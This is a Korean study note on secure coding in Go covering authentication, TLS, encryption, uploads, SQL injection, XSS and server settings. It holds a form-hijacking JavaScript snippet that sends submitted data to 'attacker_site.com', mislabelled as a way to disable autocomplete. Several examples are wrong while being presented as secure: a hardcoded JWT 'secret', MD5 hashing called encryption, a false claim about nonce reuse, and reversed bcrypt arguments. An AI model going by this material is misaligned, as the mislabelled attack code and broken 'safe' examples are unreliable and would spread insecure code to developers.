안녕하세요. SUA 오픈소스 보안 스터디입니다.

## access-control

* 다음 코드는 현재 시각으로부터 30분간 토큰과 쿠키를 생성시키는 코드입니다.  
  시간이 지나면 만료가 되어, 토큰과 쿠키를 재발급해야 합니다.
**_안전한 코드_**
```golang
    expireToken := time.Now().Add(time.Minute * 30).Unix()
    expireCookie := time.Now().Add(time.Minute * 30)
```
<br/>

* JWT라고 불리는 JSON의 웹 토큰을 사용하여 인증을 강화합니다.
> **NewWithClaims** = 함수에 원하는 서명 메소드와 자신이 정의한 구조체를 넣어두는 곳  
> **SignedString** = jwt.NewWithClaims 함수로부터 값을 전달받고 토큰을 서명한다
**_안전한 코드_**
```golang
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    signedToken, _ := token.SignedString([]byte("secret"))
```
<br/>

* JWT를 임포트하기 위해서 다음과 같은 코드를 작성합니다.
```golang
   "github.com/dgrijalva/jwt-go"
```
<br/>

* 저장할 데이터의 JWT 스키마의 작성 예시는 다음과 같습니다
```golang
    type Claims struct {
      Username string `json:"username"`
      jwt.StandardClaims
    }
```
<br/>

* 다음 코드는 쿠키 파라미터를 세팅하는 코드이다.  
30분 후 만료되며, HTTP 전용이다. 경로와 도메인도 설정되어 있다.
```golang
cookie := http.Cookie{Name: "Auth", Value: signedToken, Expires: expireCookie, HttpOnly: true, Path: "/", Domain: "127.0.0.1", Secure: true}
http.SetCookie(res, &cookie)
http.Redirect(res, req, "/profile", http.StatusTemporaryRedirect)
```
<br/>

* 이번 함수는 개인 페이지를 보호해주는 기능을 수행한다.
```golang
func validate(page http.HandlerFunc) http.HandlerFunc {
	return func(res http.ResponseWriter, req *http.Request) {
		cookie, err := req.Cookie("Auth")
		if err != nil {
			res.Header().Set("Content-Type", "text/html")
			fmt.Fprint(res, "Unauthorized - Please login <br>")
			fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
			return
		}

		token, err := jwt.ParseWithClaims(cookie.Value, &Claims{}, func(token *jwt.Token) (interface{}, error) {
			if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, fmt.Errorf("unexpected signing method")
			}
			return []byte("secret"), nil
		})
		if err != nil {
			res.Header().Set("Content-Type", "text/html")
			fmt.Fprint(res, "Unauthorized - Please login <br>")
			fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
			return
		}

		if claims, ok := token.Claims.(*Claims); ok && token.Valid {
			ctx := context.WithValue(req.Context(), MyKey, *claims)
			page(res, req.WithContext(ctx))
		} else {
			res.Header().Set("Content-Type", "text/html")
			fmt.Fprint(res, "Unauthorized - Please login <br>")
			fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
			return
		}
	}
}
```
<br/>

* 이번 코드에 나오는 함수는 클라이언트에 유효한 토큰이 있는 경우에만 볼 수 있게 해주는 기능을 수행한다
```golang
func protectedProfile(res http.ResponseWriter, req *http.Request) {
	claims, ok := req.Context().Value(MyKey).(Claims)
	if !ok {
		res.Header().Set("Content-Type", "text/html")
		fmt.Fprint(res, "Unauthorized - Please login <br>")
		fmt.Fprintf(res, "<a href=\"login\"> Login </a>")
		return
	}
	url := req.URL.Query().Get("page")

	if url == "page2" {
		res.Header().Set("Content-Type", "text/html")
		fmt.Fprint(res, "PAGE 2 <br>")
		fmt.Fprintf(res, "<a href=\"logout\"> Logout </a>")
	} else {
		res.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(res, "Hello %s <br>", claims.Username)
		fmt.Fprintf(res, "<a href=\"logout\"> Logout </a>")
	}
}
```
<br/>

* 다음 코드는 쿠키를 제거하는 역할을 수행한다
```golang
func logout(res http.ResponseWriter, req *http.Request) {
	deleteCookie := http.Cookie{Name: "Auth", Value: "none", Expires: time.Now()}
	http.SetCookie(res, &deleteCookie)
}
```

## communication-security
* 다음은 TLS를 통해 인증을 수행하는 코드이다.  

**_취약한 코드_**
```golang
   log.Fatal(http.ListenAndServeTLS(":443", "yourCert.pem", "yourKey.pem", nil))
```
이 코드는 검증의 과정을 제대로 수행하지 않기 때문에 취약해질 가능성이 있다.<br/><br/>

* 그래서 다음과 같은 코드로 검증을 하는 것이 중요하다.
**_안전한 코드_**
```golang
 var certs []Certificates
    certs = append(certs, Certificates{
        CertFile: "../etc/yourSite.pem", //본인 사이트의 인증서 키 
        KeyFile:  "../etc/yourSite.key",  // 본인 사이트의 개인키
    })

    config := &tls.Config{}
    var err error
	
    config.Certificates = make([]tls.Certificate, len(certs))
    for i, v := range certs {
	// LoadX509KeyPair = 파일에서 공개/개인 키를 읽으면서 분석한다.
        config.Certificates[i], err = tls.LoadX509KeyPair(v.CertFile, v.KeyFile)
    }
```
<br/>

* 다음은 WebSocket에서 보안을 수행하는 과정이다.  
Header에서 값을 가져와, 값이 호스트와 같은지 비교한다. 같지 않으면 에러가 발생한다.
```golang
	if r.Header.Get("Origin") != "http://"+r.Host{
		http.Error(w, "Origin not allowed", 403)
			return
	}else{
		websocket.Handler(EchoHandler).ServeHTTP(w, r)
	}
```

## data_protection

* 다음은 데이터를 암호화하여 보호하는 과정을 나타내는 코드이다.<br/>
**_예시 코드_**
```golang
// 반환 값은 "change this password to a secret"이다.
secretKeyBytes, err := hex.DecodeString("6368616e676520746869732070617373776f726420746f206120736563726574")
if err != nil {
    panic(err)
}

var secretKey [32]byte
// secretKey = "change this password to a secret"
copy(secretKey[:], secretKeyBytes)

var nonce [24]byte
if _, err := rand.Read(nonce[:]); err != nil {
    panic(err)
}

encrypted := secretbox.Seal(nonce[:], []byte("hello world"), &nonce, &secretKey)

var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])

decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
if !ok {
    panic("decryption error")
}

fmt.Println(string(decrypted))
```
<br/>

* 이 코드에서 취약점이 발생할 수 있다.  
복호화를 하는 과정에서, 암호화 할 때 사용한 것과 동일한 nonce와 키를 사용하지 않았고,  
이 과정에서 취약점으로 이어질 수 있다.<br/>
**_취약점 코드_**
```golang
var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])
decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
```
<br/>

* 데이터를 보호하는 방법은 여러가지 있는데, 그 중 하나가 비활성화이다.  
```golang
<form method="post" action="/form" autocomplete="off">
<input type="text" id="cc" name="cc" autocomplete="off">
```
특정 양식에서 자동완성을 비활성화 하는 방법이다.<br/><br/>

* 이번 코드는 로그인 양식에서 자동완성을 비활성화 하는 코드이다.
```golang
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
```
<br/>

* 이 코드는 민감한 정보가 포함된 페이지의 캐시 제어를 비활성화 하는 코드이다.
```golang
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
```

## file_management
* 파일 관리에서 보안 설정을 하는 방법은 다음과 같다.  
```golang
{...}
buff := make([]byte, 512)
_, err = file.Read(buff)
{...}

filetype := http.DetectContentType(buff)

{...}
switch filetype {
case "image/jpeg", "image/jpg":
  fmt.Println(filetype)
case "image/gif":
  fmt.Println(filetype)
case "image/png":
  fmt.Println(filetype)
default:
  fmt.Println("unknown file type uploaded")
}
{...}
```
이 코드는 버퍼에 쓰여진 데이터를 보고 파일 타입을 지정한 다음에, 지정한 파일 타입만 허용하는 코드이다.<br/><br/>

## output-encoding
* 다음에 나오는 코드는 SQL Injection에 취약한 코드이다.  
변수값이 그대로 쿼리에 주입되기 때문에 취약하다고 볼 수 있다.<br/>
**_취약한 코드_**
```golang
func main(){
	ctx:=context.Background()
	customerId := r.URL.Query.Get("id")
  
	query := "SELECT number, expireDate, cvv FROM creditcards WHERE customerId = "+customerId
	row, _ = db.QueryContext(ctx, query)
}
```
<br/>

* SQL Injection으로부터 안전해지기 위해, 다음과 같은 코드를 작성한다.  
SQL Injection을 시도하려고 해도 '?' 때문에 쿼리로 인식하지 않게 한다.<br/>
**_안전한 코드_**
```golang
func main(){
	ctx:=context.Background()
	customerId := r.URL.Query.Get("id")

	query := "SELECT number, expireDate, cvv FROM creditcards WHERE customerId = ?"
	row, _ = db.QueryContext(ctx, query, customerId)
}
```
<br/>

* 다음은 XSS에 취약해지게 되는 코드이다.  
입력값을 검증하는 과정을 거치지 않는다.<br/>
**_취약한 코드_**
```golang
package main

import "net/http"
import "io"

func handler (w http.ResponseWriter, r *http.Request) {
    io.WriteString(w, r.URL.Query().Get("param1"))
}

func main () {
    http.HandleFunc("/", handler)
    http.ListenAndServe(":8070", nil)
}
```
<br/>

* XSS로부터 안전해지려면, 다음과 같이 코드를 작성한다.<br/>
**_안전한 코드_**
```golang
package main

import "net/http"
import "text/template"

func handler(w http.ResponseWriter, r *http.Request) {
        param1 := r.URL.Query().Get("param1")
	
        tmpl := template.New("hello")
        tmpl, _ = tmpl.Parse(`{{define "T"}}{{.}}{{end}}`)
        tmpl.ExecuteTemplate(w, "T", param1)
}

func main() {
        http.HandleFunc("/", handler)
        http.ListenAndServe(":8070", nil)
}
```
<br/>

* 이 패키지는 HTML 출력을 자동으로 보호해주는 패키지이다.
```golang
import "text/template"
```
<br/>

* 이 과정에서 HTML 템플릿의 문맥을 자동으로 이스케이프 해준다.
```golang
        tmpl := template.New("hello")
        tmpl, _ = tmpl.Parse(`{{define "T"}}{{.}}{{end}}`)
        tmpl.ExecuteTemplate(w, "T", param1)
```

## system_configuration
* 서버 설정도 제대로 해야, 애플리케이션이 안전하다.  
다음 코드는 디렉토리 인덱싱 공격에 취약한 코드다.
```golang
http.ListenAndServe(":8080", http.FileServer(http.Dir("/tmp/static")))
```
FileServer 메소드는 서버에 저장된 파일들을 보여준다.  
이 과정에서 보여주길 원하지 않는 파일도 보여줄 수 있게 된다.
<br/>

#### 공격으로부터 안전하게 하는 서버의 설정은 여러가지이다.  
<br/>
* 이 코드를 작성하면 Proto는 무시되고 HTTP/1.1을 사용하여 요청하게 된다.
```golang
req, _ := http.NewRequest("POST", url, buffer)
req.Proto = "HTTP/1.0"
```
<br/>

* 다음과 같은 코드는 디렉토리 목록을 비활성화 하게 하는 코드이다.
```golang
type justFilesFilesystem struct {
    fs http.FileSystem
}
```
<br/>

* 다음 코드는 요청된 경로와 파일이 표시될 수 있는지의 여부를 확인하는 기능을 수행한다.
```golang
func (fs justFilesFilesystem) Open(name string) (http.File, error) {
    f, err := fs.fs.Open(name)
    if err != nil {
        return nil, err
    }
    return neuteredReaddirFile{f}, nil
}
```
<br/>

* 다음 코드는 tmp/static/ 경로만 표시하도록 하는 기능을 수행한다.
```golang
fs := justFilesFilesystem{http.Dir("tmp/static/")}
http.ListenAndServe(":8080", http.StripPrefix("/tmp/static", http.FileServer(fs)))
```
<br/>

* 다음 코드는 X-Request-With 헤더를 Go vulnerable Framework 1.2로 설정하는 코드이다.
```golang
w.Header().Set("X-Request-With", "Go Vulnerable Framework 1.2")
```
<br/>

* 다음 코드는 POST, GET 메소드만 허용하게 하는 코드이다.
```golang
w.Header().Set("Access-Control-Allow-Methods", "POST, GET")
```
<br/>

* 다음 설정은 Allow에 나온 경로만 허용하고 나머지는 전부 거부하는 설정이다.
```golang
User-agent: *
Allow: /sitemap.xml
Allow: /index
Allow: /contact
Allow: /aboutus
Disallow: /
```
<br/>

## Authentication-Password-Management


**_안전한 코드 [ 통신 인증 데이터 ]_**
```golang
// 패스워드를 비활성화한다.
// password Type을 사용함으로써 패스워드가 사용자 화면에서 보이지 않게 한다.
<input type="password" name="passwd" autocomplete="off" />
```
```golang
// POST로 form 데이터를 전송하며, Token도 같이 보낸다.
<form method="post" action="https://somedomain.com/user/signin" autocomplete="off">
    <input type="hidden" name="csrf" value="CSRF-TOKEN" />

    <label>Username <input type="text" name="username" /></label>
    <label>Password <input type="password" name="password" /></label>

    <input type="submit" value="Submit" />
</form>
```
```golang
<form method="post" action="https://somedomain.com/user/signin" autocomplete="off">
    <input type="hidden" name="csrf" value="CSRF-TOKEN" />
    
    // ID, PASSWD중 하나만 틀렸다고 해도, 어느 부분이 잘못되었는지 알리면 안된다.
    // "아이디나 패스워드 중 하나가 잘못되었다"고 해야한다.
    <div class="error">
        <p>Invalid username and/or password</p>
    </div>

    <label>Username <input type="text" name="username" /></label>
    <label>Password <input type="password" name="password" /></label>

    <input type="submit" value="Submit" />
</form>
```
<br/>

**_안전한 코드 [ 검증 및 저장 ]_**
```golang
package main

import (
    "database/sql"
    "context"
    "fmt"

    "golang.org/x/crypto/bcrypt"
)

func main() {
    ctx := context.Background()
    email := []byte("john.doe@somedomain.com")
    password := []byte("47;u5:B(95m72;Xq")

    // bcrypt로 패스워드를 암호화 함
    hashedPassword, err := bcrypt.GenerateFromPassword(password, bcrypt.DefaultCost)
    if err != nil {
        panic(err)
    }

    // DB에 반드시 연결이 되어 있어야 함
    stmt, err := db.PrepareContext(ctx, "INSERT INTO accounts SET hash=?, email=?")
    if err != nil {
        panic(err)
    }
    result, err := stmt.ExecContext(ctx, hashedPassword, email)
    if err != nil {
        panic(err)
    }
}


ctx := context.Background()

// 검증할 인증 정보
email := []byte("john.doe@somedomain.com")
password := []byte("47;u5:B(95m72;Xq")

// 제공된 전자 메일에 해당되는 해시된 암호를 가져옴
record := db.QueryRowContext(ctx, "SELECT hash FROM accounts WHERE email = ? LIMIT 1", email)

var expectedPassword string
if err := record.Scan(&expectedPassword); err != nil {
   // 유저가 없으면

   // 로그를 남겨야 하지만 실행한다
   // 계속 진행한다
}

if bcrypt.CompareHashAndPassword(password, []byte(expectedPassword)) != nil {
   // 패스워드가 일치하지 않으면
   // 로그에 남깁니다

   // 오류에 반환되어야 "로그인 시도에 실패했습니다. 자격 증명을 확인하세요"라는 메시지가 사용자에게 뜹니다.
}
```
<br/>

## Cryptographic-Practice

* 기본적으로 암호화와 복호화는 다음과 같이 진행된다.
```golang
// 암호화
encrypted_data := F(data, key)
```
```golang
// 복호화
data := F⁻¹(encrypted_data, key)
```
<br/>

**_안전한 코드 [ 암호 ]_**
```golang
func main () {
        h_md5 := md5.New()
        h_sha := sha256.New()
        h_blake2s, _ := blake2s.New256(nil)
	
	// md5로 암호화
        io.WriteString(h_md5, "Welcome to Go Language Secure Coding Practices")

	// sha256으로 암호화
        io.WriteString(h_sha, "Welcome to Go Language Secure Coding Practices")

	// blake2로 암호화
	// black2 : MD5, SHA-1, SHA-2, SHA-3보다 빠른 암호화 해시 함수, SHA-3만큼 안전
        io.WriteString(h_blake2s, "Welcome to Go Language Secure Coding Practices")
        fmt.Printf("MD5        : %x\n", h_md5.Sum(nil))
        fmt.Printf("SHA256     : %x\n", h_sha.Sum(nil))
        fmt.Printf("Blake2s-256: %x\n", h_blake2s.Sum(nil))
}
```
